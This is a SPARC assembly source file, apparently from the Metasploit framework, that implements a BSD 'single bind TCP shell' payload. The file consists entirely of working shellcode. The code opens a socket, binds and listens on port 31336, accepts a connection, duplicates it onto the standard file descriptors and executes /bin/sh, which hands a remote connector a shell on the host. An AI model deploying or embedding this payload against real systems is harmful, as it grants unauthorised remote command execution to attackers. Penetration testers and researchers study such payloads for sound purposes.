##
#
#        Name: single_bind_tcp
#   Platforms: *BSD
#     Authors: vlad902 <vlad902 [at] gmail.com>
#     Version: $Revision: 1652 $
#     License:
#
#        This file is part of the Metasploit Exploit Framework
#        and is subject to the same licenses and copyrights as
#        the rest of this package.
#
# Description:
#
#        Single bind TCP shell.
#
##

.globl main

main:
	andn	%sp, 7, %sp

	xor	%o3, %o3, %o2
	mov	0x01, %o1
	mov	0x02, %o0
	mov	0x61, %g1
	ta	0x08

	st	%o0, [ %sp - 0x08 ]

	set	0xff027a68, %l0
	st	%l0, [ %sp - 0x10 ]
	st	%g0, [ %sp - 0x0c ]
	sub	%sp, 16, %o1
	mov	0x10, %o2
	mov	0x68, %g1
	ta	0x08

	ld	[ %sp - 0x08 ], %o0
	mov	0x01, %o1
	mov	0x6a, %g1
	ta	0x08

	ld	[ %sp - 0x08 ], %o0
	xor	%o1, %o1, %o1
	or	%o1, %o1, %o2
	mov	0x1e, %g1
	ta	0x08

	st	%o0, [ %sp - 0x08 ]
	mov	3, %o1
dup2_loop:
	subcc	%o1, 1, %o1
	mov	0x5a, %g1
	ta	0x08

	bnz	dup2_loop
	ld	[ %sp - 0x08 ], %o0

	xor	%o3, %o3, %o2
	set	0x2f62696e, %l0
	set	0x2f736800, %l1
	sub	%sp, 0x10, %o0
	sub	%sp, 0x08, %o1
	std	%l0, [ %sp - 0x10 ]	
	st	%o0, [ %sp - 0x08 ]
	st	%g0, [ %sp - 0x04 ]
	mov	0x3b, %g1
	ta	0x08
